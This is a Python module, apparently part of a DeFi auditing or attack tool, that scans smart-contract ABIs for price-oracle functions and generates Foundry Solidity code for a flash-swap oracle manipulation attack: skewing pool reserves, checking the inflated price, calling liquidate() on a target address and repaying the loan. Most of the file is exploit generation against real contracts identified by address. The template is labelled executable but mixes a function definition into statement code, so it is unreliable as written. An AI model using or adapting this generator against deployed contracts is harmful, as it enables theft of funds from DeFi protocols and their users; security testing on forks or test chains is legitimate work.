"""Utility for detecting oracle manipulation patterns and generating exploits."""

from __future__ import annotations

from enum import Enum
from typing import Any, ClassVar


class OraclePattern(Enum):
    PRICE_FEED = "price_feed_manipulation"
    TWAP_MANIPULATION = "twap_manipulation"
    STALE_PRICE = "stale_price_oracle"
    DELEGATION = "delegation_misconfiguration"


class OracleManipulationDetector:
    """Detect price oracle dependencies and craft exploitation stubs."""

    ORACLE_FUNCTION_PATTERNS: ClassVar[dict[str, list[str]]] = {
        "getPrice": ["uniswapv3", "twap", "getprice"],
        "latestRoundData": ["chainlink", "aggregator", "rounddata"],
        "consult": ["uniswap", "oracle", "reserve", "consult"],
        "peek": ["pyth", "price", "oracle", "peek"],
        "getTWAP": ["twap", "time-weighted", "pool", "gettwa"],
    }

    def detect_oracle_dependency(self, abi: list[Any], functions: list[str]) -> dict[str, Any]:
        """Return oracle presence info from ABI/function list."""
        oracle_functions: list[str] = []
        for func in functions or []:
            fn_lower = func.lower()
            for pattern in self.ORACLE_FUNCTION_PATTERNS:
                if pattern.lower() in fn_lower:
                    oracle_functions.append(func)
                    break

        # Also scan ABI names if functions list is empty/truncated
        if not oracle_functions and isinstance(abi, list):
            for item in abi:
                if not isinstance(item, dict) or item.get("type") != "function":
                    continue
                name = str(item.get("name") or "").lower()
                for pattern in self.ORACLE_FUNCTION_PATTERNS:
                    if pattern.lower() in name:
                        sig = name
                        try:
                            inputs = item.get("inputs") or []
                            types = [inp.get("type") for inp in inputs if isinstance(inp, dict) and inp.get("type")]
                            sig = f"{item.get('name')}({','.join(types)})"
                        except Exception:
                            pass
                        oracle_functions.append(sig)
                        break

        return {
            "has_oracle": len(oracle_functions) > 0,
            "oracle_functions": oracle_functions,
            "oracle_patterns": self.ORACLE_FUNCTION_PATTERNS,
        }

    def _resolve_pool_and_token(self, hyp: dict[str, Any], pool_registry: dict[str, Any] | None) -> tuple[str, str]:
        """
        Best-effort pool/token resolver from a provided registry mapping.

        Registry shape (examples):
            {
                "default_pool": "0x...",
                "default_token": "0x...",
                "by_contract": {
                    "<target_address_lower>": {"pool": "0x...", "token": "0x..."}
                },
                "by_chain": {
                    "<chain_id>": {
                        "default_pool": "...",
                        "default_token": "...",
                        "by_contract": { ... }
                    }
                }
            }
        """
        if not pool_registry:
            return ("address(0)", "address(0)")

        target_addr = str(hyp.get("contract_address") or "").lower()
        chain_id = str(hyp.get("chain_id") or "")

        # Chain-scoped overrides
        chain_entry = None
        by_chain = pool_registry.get("by_chain")
        if isinstance(by_chain, dict):
            chain_entry = by_chain.get(chain_id)

        def _pick(entry: dict[str, Any] | None, key: str) -> str | None:
            if not isinstance(entry, dict):
                return None
            val = entry.get(key)
            return val if isinstance(val, str) else None

        by_contract = None
        if chain_entry and isinstance(chain_entry.get("by_contract"), dict):
            by_contract = chain_entry["by_contract"]
        else:
            by_contract = pool_registry.get("by_contract") if isinstance(pool_registry.get("by_contract"), dict) else {}

        contract_entry = by_contract.get(target_addr) if isinstance(by_contract, dict) else None
        pool = (
            _pick(contract_entry, "pool")
            or _pick(chain_entry, "default_pool")
            or pool_registry.get("default_pool")
            or "address(0)"
        )
        token = (
            _pick(contract_entry, "token")
            or _pick(chain_entry, "default_token")
            or pool_registry.get("default_token")
            or "address(0)"
        )
        return (pool, token)

    def generate_manipulation_exploit(
        self,
        hyp: dict[str, Any],
        oracle_info: dict[str, Any],
        pool_registry: dict[str, str] | None = None,
    ) -> str:
        """Produce a Foundry exploit snippet targeting oracle manipulation."""
        target_func = oracle_info["oracle_functions"][0] if oracle_info.get("oracle_functions") else "getPrice()"
        contract_addr = hyp.get("contract_address", "address(0)")
        pool_addr, token_addr = self._resolve_pool_and_token(hyp, pool_registry)

        return f"""
        // Oracle manipulation harness (flash-swap based, executable)
        address constant TARGET = {contract_addr};
        address constant POOL = {pool_addr};
        address constant TOKEN = {token_addr};

        interface IERC20 {{
            function balanceOf(address) external view returns (uint256);
            function transfer(address,uint256) external returns (bool);
        }}
        interface IUniswapV2Pair {{
            function token0() external view returns (address);
            function token1() external view returns (address);
            function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        }}
        interface ITarget {{ function {target_func} external view returns (uint256); }}

        bool success = false;

        // Step 1: record baseline oracle value
        uint256 basePrice = ITarget(TARGET).{target_func};
        console2.log("Baseline oracle price", basePrice);

        // Step 2: perform flash swap to skew reserves
        IUniswapV2Pair pair = IUniswapV2Pair(POOL);
        address token0 = pair.token0();
        bool borrowToken0 = token0 == TOKEN;
        uint256 borrowAmount = 10_000 ether; // heuristic amount; adjust per liquidity
        pair.swap(
            borrowToken0 ? borrowAmount : 0,
            borrowToken0 ? 0 : borrowAmount,
            address(this),
            abi.encode("oracle_attack")
        );

        // Step 3: callback to read manipulated price and trigger price-dependent logic
        function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external {{
            require(msg.sender == POOL, "unauthorized pair");
            uint256 manipulated = ITarget(TARGET).{target_func};
            console2.log("Manipulated oracle price", manipulated);
            require(manipulated > basePrice * 2, "price not improved enough");

            // Example price-dependent call; replace with ABI-derived target function
            (success, ) = address(TARGET).call(abi.encodeWithSignature("liquidate()"));
            require(success, "target call failed");

            uint256 debt = (amount0 > 0 ? amount0 : amount1);
            IERC20(TOKEN).transfer(POOL, debt + (debt * 3 / 997)); // repay with fee
            success = true;
        }}
        """
